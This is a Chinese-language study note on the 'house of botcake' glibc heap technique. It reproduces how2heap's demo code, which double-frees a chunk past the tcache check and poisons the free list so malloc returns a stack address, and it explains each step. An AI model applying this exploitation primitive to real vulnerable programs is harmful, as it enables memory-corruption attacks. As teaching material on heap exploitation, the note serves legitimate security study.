# house of botcake 笔记

glibc2.29 tcache机制下DoubleFree的出路

### 0x1 分析

#### [实例源码](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/house_of_botcake.c)

来自how2heap

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>


int main()
{
    /*
     * This attack should bypass the restriction introduced in
     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
     * If the libc does not include the restriction, you can simply double free the victim and do a
     * simple tcache poisoning
     * And thanks to @anton00b and @subwire for the weird name of this technique */

    // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    // introduction
    puts("This file demonstrates a powerful tcache poisoning attack by tricking malloc into");
    puts("returning a pointer to an arbitrary location (in this demo, the stack).");
    puts("This attack only relies on double free.\n");

    // prepare the target
    intptr_t stack_var[4];
    puts("The address we want malloc() to return, namely,");
    printf("the target address is %p.\n\n", stack_var);

    // prepare heap layout
    puts("Preparing heap layout");
    puts("Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.");
    intptr_t *x[7];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
        x[i] = malloc(0x100);
    }
    puts("Allocating a chunk for later consolidation");
    intptr_t *prev = malloc(0x100);
    puts("Allocating the victim chunk.");
    intptr_t *a = malloc(0x100);
    printf("malloc(0x100): a=%p.\n", a); 
    puts("Allocating a padding to prevent consolidation.\n");
    malloc(0x10);
    
    // cause chunk overlapping
    puts("Now we are able to cause chunk overlapping");
    puts("Step 1: fill up tcache list");
    for(int i=0; i<7; i++){
        free(x[i]);
    }
    puts("Step 2: free the victim chunk so it will be added to unsorted bin");
    free(a);
    
    puts("Step 3: free the previous chunk and make it consolidate with the victim chunk.");
    free(prev);
    
    puts("Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n");
    malloc(0x100);
    /*VULNERABILITY*/
    free(a);// a is already freed
    /*VULNERABILITY*/
    
    // simple tcache poisoning
    puts("Launch tcache poisoning");
    puts("Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk");
    intptr_t *b = malloc(0x120);
    puts("We simply overwrite victim's fwd pointer");
    b[0x120/8-2] = (long)stack_var;
    
    // take target out
    puts("Now we can cash out the target chunk.");
    malloc(0x100);
    intptr_t *c = malloc(0x100);
    printf("The new chunk is at %p\n", c);
    
    // sanity check
    assert(c==stack_var);
    printf("Got control on target/stack!\n\n");
    
    // note
    puts("Note:");
    puts("And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim");
    puts("In that case, once you have done this exploitation, you can have many arbitary writes very easily.");

    return 0;
}
```

#### 流程

目的是获得栈上`stack_var`的地址

1. 先申请`7`个与`victim`相同大小的`chunk`准备填满`tcache bin`。

2. 申请两个堆，一个`prev`用来之后与`victim`合并，一个是`victim`。另外还要有一个`barrier`

3. `free`掉那`7`个`chunk`来填满`tcache bin`。

4. `free`掉`prev`和`victim`，他们会进入Unsorted bin。并且合并，合并之后的首地址是`prev`的地址。

5. 申请掉那`7`个中的一个`chunk`，为`victim`留位置。

6. 接下来把`prev`部分的内存申请切割出去（并申请了`victim`的头部和`fk`、`bk`指针部分），留下来的部分就是`victim`里的内存。

7. 把`victim`再次`free`掉，`victim`就会进入`tcache bin`。也就绕过了`tcache`机制的Double free检查。

   相关检查代码：

   ```c
   //_int_free()
   if (__glibc_unlikely (e->key == tcache))
             {
               tcache_entry *tmp;
               LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
               for (tmp = tcache->entries[tc_idx];
                    tmp;
                    tmp = tmp->next)
                 if (tmp == e)
                   malloc_printerr ("free(): double free detected in tcache 2");
               /* If we get here, it was a coincidence.  We've wasted a
                  few cycles, but don't abort.  */
             }
   ```

8. 我们这时候修改`victim->next`为`stack_var`地址，即可申请到`stack_var`

### 0x2 reference

[知世大佬]([https://nightrainy.github.io/2020/02/20/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E5%85%AB/](https://nightrainy.github.io/2020/02/20/how2heap总结计划八/))